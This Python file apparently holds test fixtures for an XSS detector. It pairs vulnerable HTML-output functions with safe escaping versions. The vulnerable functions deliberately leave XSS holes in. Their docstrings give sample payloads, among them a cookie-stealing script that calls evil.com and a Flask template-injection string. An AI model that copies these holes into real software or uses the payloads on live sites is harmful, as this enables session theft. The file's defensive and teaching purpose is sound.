"""
Cross-Site Scripting (XSS) Test Fixtures

CWE-79: XSS
CVE-2018-14042: Bootstrap XSS vulnerability
CVE-2019-11358: jQuery XSS vulnerability
"""

import cgi
import html

from markupsafe import Markup
from markupsafe import escape as markupsafe_escape

# ==================================================
# VULNERABLE: Reflected XSS
# ==================================================


def xss_vulnerable_1_reflected(user_input: str) -> str:
    """
    ❌ CRITICAL: Reflected XSS - Direct output

    Real attack: user_input = "<script>alert(document.cookie)</script>"
    Result: Executes JavaScript in victim's browser
    """
    # VULNERABLE: No escaping
    return f"<h1>Hello {user_input}!</h1>"  # SINK: HTML output


def xss_vulnerable_2_search_results(query: str) -> str:
    """
    ❌ CRITICAL: Search results XSS

    Real attack: query = "<img src=x onerror=alert(1)>"
    """
    # VULNERABLE
    return f"""
    <div class="search-results">
        <p>Search results for: {query}</p>
    </div>
    """  # SINK


def xss_vulnerable_3_error_message(error: str) -> str:
    """
    ❌ CRITICAL: Error message XSS
    """
    # VULNERABLE: Error messages often overlooked
    return f'<div class="error">{error}</div>'  # SINK


# ==================================================
# VULNERABLE: Stored XSS
# ==================================================


def xss_vulnerable_4_stored_comment(username: str, comment: str) -> str:
    """
    ❌ CRITICAL: Stored XSS in comments

    Real attack: comment = "<script>fetch('//evil.com?c='+document.cookie)</script>"
    Result: Steals cookies from all users viewing the comment
    """
    # VULNERABLE: Stored in DB, displayed to all users
    return f"""
    <div class="comment">
        <strong>{username}</strong>: {comment}
    </div>
    """  # SINK


def xss_vulnerable_5_profile_bio(bio: str) -> str:
    """
    ❌ CRITICAL: Profile bio XSS
    """
    # VULNERABLE
    return f'<div class="bio">{bio}</div>'  # SINK


# ==================================================
# VULNERABLE: DOM-based XSS patterns
# ==================================================


def xss_vulnerable_6_javascript_context(user_data: str) -> str:
    """
    ❌ CRITICAL: XSS in JavaScript context

    Real attack: user_data = "'; alert(1); var x='"
    Result: Breaks out of string context
    """
    # VULNERABLE: User data in JS context
    return f"""
    <script>
        var userData = '{user_data}';
        console.log(userData);
    </script>
    """  # SINK


def xss_vulnerable_7_onclick(action: str) -> str:
    """
    ❌ CRITICAL: XSS in event handler

    Real attack: action = "alert(1)"
    """
    # VULNERABLE: User input in onclick
    return f'<button onclick="{action}">Click me</button>'  # SINK


def xss_vulnerable_8_href(url: str) -> str:
    """
    ❌ CRITICAL: XSS in href attribute

    Real attack: url = "javascript:alert(1)"
    Result: Executes JavaScript on click
    """
    # VULNERABLE: javascript: protocol
    return f'<a href="{url}">Click here</a>'  # SINK


# ==================================================
# VULNERABLE: Flask template injection
# ==================================================


def xss_vulnerable_9_flask_render_string(template_str: str):
    """
    ❌ CRITICAL: Flask template injection

    Real attack: template_str = "{{ config }}"
    Result: Exposes Flask config including secrets
    """
    from flask import render_template_string

    # VULNERABLE: render_template_string with user input
    return render_template_string(template_str)  # SINK


def xss_vulnerable_10_jinja2_unsafe(user_input: str):
    """
    ❌ CRITICAL: Jinja2 with autoescape=False
    """
    from jinja2 import Template

    # VULNERABLE: autoescape disabled
    template = Template("{{ user_input }}", autoescape=False)
    return template.render(user_input=user_input)  # SINK


# ==================================================
# SAFE: HTML escaping (BEST PRACTICE)
# ==================================================


def xss_safe_1_html_escape(user_input: str) -> str:
    """
    ✅ SECURE: Using html.escape()

    Escapes: < > & " '
    """
    # SAFE: html.escape() from standard library
    safe_input = html.escape(user_input)

    return f"<h1>Hello {safe_input}!</h1>"


def xss_safe_2_cgi_escape(user_input: str) -> str:
    """
    ✅ SECURE: Using cgi.escape() (deprecated but works)
    """
    # SAFE: cgi.escape() (Python 2 compatible)
    safe_input = cgi.escape(user_input, quote=True)

    return f"<h1>Hello {safe_input}!</h1>"


def xss_safe_3_markupsafe(user_input: str) -> str:
    """
    ✅ SECURE: Using markupsafe.escape()

    markupsafe is used by Flask/Jinja2.
    """
    # SAFE: markupsafe.escape()
    safe_input = markupsafe_escape(user_input)

    return f"<h1>Hello {safe_input}!</h1>"


# ==================================================
# SAFE: Template auto-escaping
# ==================================================


def xss_safe_4_jinja2_autoescape(user_input: str):
    """
    ✅ SECURE: Jinja2 with autoescape enabled
    """
    from jinja2 import Template

    # SAFE: autoescape=True (default in Flask)
    template = Template("{{ user_input }}", autoescape=True)
    return template.render(user_input=user_input)


def xss_safe_5_flask_template(username: str, comment: str):
    """
    ✅ SECURE: Flask template with auto-escaping

    Flask templates auto-escape by default.
    """
    from flask import render_template

    # SAFE: Flask auto-escapes template variables
    return render_template("comment.html", username=username, comment=comment)


# ==================================================
# SAFE: Django template auto-escaping
# ==================================================


def xss_safe_6_django_template(user_input: str):
    """
    ✅ SECURE: Django template auto-escaping
    """
    from django.template import Context, Template

    # SAFE: Django auto-escapes by default
    template = Template("{{ user_input }}")
    return template.render(Context({"user_input": user_input}))


def xss_safe_7_django_utils(user_input: str) -> str:
    """
    ✅ SECURE: Django's escape utilities
    """
    from django.utils.html import escape

    # SAFE: Django's escape function
    safe_input = escape(user_input)

    return f"<h1>Hello {safe_input}!</h1>"


# ==================================================
# SAFE: Context-specific escaping
# ==================================================


def xss_safe_8_javascript_context(user_data: str) -> str:
    """
    ✅ SECURE: JSON encoding for JS context
    """
    import json

    # SAFE: JSON.stringify() escapes properly
    safe_data = json.dumps(user_data)

    return f"""
    <script>
        var userData = {safe_data};
        console.log(userData);
    </script>
    """


def xss_safe_9_url_validation(url: str) -> str:
    """
    ✅ SECURE: URL validation
    """
    from urllib.parse import urlparse

    # Validate URL scheme
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https", ""):
        raise ValueError("Invalid URL scheme")

    # SAFE: Validated URL
    safe_url = html.escape(url)
    return f'<a href="{safe_url}">Click here</a>'


def xss_safe_10_attribute_escape(css_class: str) -> str:
    """
    ✅ SECURE: HTML attribute escaping
    """
    # SAFE: Escape for attribute context
    safe_class = html.escape(css_class, quote=True)

    return f'<div class="{safe_class}">Content</div>'


# ==================================================
# SAFE: Content Security Policy (Defense in depth)
# ==================================================


def xss_safe_11_csp_header() -> dict:
    """
    ✅ SECURE: Content Security Policy header

    Defense in depth: CSP prevents XSS even if escaping fails.
    """
    # SAFE: CSP header blocks inline scripts
    return {
        "Content-Security-Policy": (
            "default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none'; base-uri 'self';"
        )
    }


# ==================================================
# SAFE: Sanitization libraries
# ==================================================


def xss_safe_12_bleach(user_html: str) -> str:
    """
    ✅ SECURE: Using bleach library for HTML sanitization

    When you need to allow some HTML (e.g., rich text editor).
    """
    try:
        import bleach
    except ImportError:
        raise ImportError("bleach not installed. Install with: pip install codegraph[cwe]")

    # SAFE: bleach allows only safe tags
    ALLOWED_TAGS = ["p", "strong", "em", "a", "ul", "ol", "li"]
    ALLOWED_ATTRIBUTES = {"a": ["href", "title"]}

    safe_html = bleach.clean(user_html, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRIBUTES, strip=True)

    return safe_html


# ==================================================
# EDGE CASE: Markup() bypass (DANGEROUS)
# ==================================================


def xss_edge_case_1_markup_bypass(user_input: str) -> str:
    """
    ⚠️ VULNERABLE: Markup() marks string as safe

    Markup() tells template engine "don't escape this".
    NEVER use with user input!
    """
    # VULNERABLE: Markup() disables escaping
    return str(Markup(user_input))  # SINK


def xss_edge_case_2_safe_filter(user_input: str):
    """
    ⚠️ VULNERABLE: Jinja2 |safe filter
    """
    from jinja2 import Template

    # VULNERABLE: |safe disables escaping
    template = Template("{{ user_input|safe }}")
    return template.render(user_input=user_input)  # SINK


# ==================================================
# Real-world patterns
# ==================================================


def xss_safe_13_rich_text_preview(markdown_text: str) -> str:
    """
    ✅ SECURE: Markdown to HTML with sanitization
    """
    try:
        import bleach
        import markdown
    except ImportError:
        raise ImportError("bleach/markdown not installed. Install with: pip install codegraph[cwe]")

    # Convert markdown to HTML
    html_output = markdown.markdown(markdown_text)

    # SAFE: Sanitize the output
    ALLOWED_TAGS = ["p", "h1", "h2", "h3", "strong", "em", "code", "pre", "ul", "ol", "li", "a", "blockquote"]
    ALLOWED_ATTRIBUTES = {"a": ["href"], "code": ["class"]}

    safe_html = bleach.clean(html_output, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRIBUTES)

    return safe_html
